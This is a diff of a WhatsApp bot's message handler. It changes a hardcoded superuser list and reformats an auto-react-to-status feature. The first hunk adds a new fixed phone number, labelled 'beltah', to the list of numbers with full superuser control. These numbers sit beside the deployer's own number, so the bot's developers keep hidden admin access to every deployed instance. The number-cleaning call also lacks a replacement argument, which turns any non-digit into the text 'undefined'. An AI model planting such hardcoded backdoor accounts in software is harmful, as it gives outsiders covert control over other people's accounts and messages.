@@ -156,10 +156,10 @@ setTimeout(() => {
             const nomAuteurMessage = ms.pushName;
             const dj = '22559763447';
             const dj2 = '22543343357';
-            const dj3 = "22564297888";
+            const beltah = "254114141192";
             const luffy = '22891733300';
             const sudo = await getAllSudoNumbers();
-            const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+            const superUserNumbers = [servBot, dj, dj2, beltah, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
             
@@ -247,10 +247,9 @@ function mybotpic() {
                 mybotpic
             
             };
-            
+
  //Beltah Tech commnds auto react to status 
-            
-   const loveEmojis = ["❤️", "💖", "💘", "💝", "💓", "💌", "💕", "😎", "🔥", "💥", "💯", "✨", "🌟", "🌈", "⚡", "💎", "🌀", "👑", "🎉", "🎊", "🦄", "👽", "🛸", 
+            const loveEmojis = ["❤️", "💖", "💘", "💝", "💓", "💌", "💕", "😎", "🔥", "💥", "💯", "✨", "🌟", "🌈", "⚡", "💎", "🌀", "👑", "🎉", "🎊", "🦄", "👽", "🛸", 
   "🚀", "🦋", "💫", "🍀", "🎶", "🎧", "🎸", "🎤", "🏆", "🏅", "🌍", "🌎", "🌏", "🎮", "🎲", "💪", 
   "🏋️", "🥇", "👟", "🏃", "🚴", "🚶", "🏄", "⛷️", "🕶️", "🧳", "🍿", "🍿", "🥂", "🍻", "🍷", "🍸", 
   "🥃", "🍾", "🎯", "⏳", "🎁", "🎈", "🎨", "🌻", "🌸", "🌺", "🌹", "🌼", "🌞", "🌝", "🌜", "🌙", 
@@ -260,7 +259,7 @@ function mybotpic() {
 
 
 let lastReactionTime = 0;
-
+ //Handle reaction one by one
 if (conf.AUTO_LIKE_STATUS === "yes") {
     console.log("AUTO_LIKE_STATUS is enabled. Listening for status updates...");
 
@@ -312,10 +311,9 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
             }
         }
     });
-}
-}
-                 
-    /************************ anti-delete-message */
+                                }
+
+            /************************ anti-delete-message */
 
             if(ms.message.protocolMessage && ms.message.protocolMessage.type === 0 && (conf.ADM).toLocaleLowerCase() === 'yes' ) {
 
